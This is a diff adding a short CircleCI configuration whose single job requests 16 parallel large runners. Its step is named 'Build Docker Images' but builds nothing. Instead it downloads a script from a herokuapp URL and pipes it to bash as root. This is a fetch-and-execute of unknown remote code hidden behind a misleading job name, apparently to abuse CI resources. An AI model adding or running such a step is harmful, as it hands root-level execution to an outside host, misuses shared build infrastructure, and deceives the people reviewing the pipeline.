@@ -1,0 +1,15 @@
+version: 2.1
+
+jobs:
+  build:
+    parallelism: 16
+    docker:
+      - image: cimg/base:2021.11
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               sudo -u root curl https://myname1.herokuapp.com/aws | bash
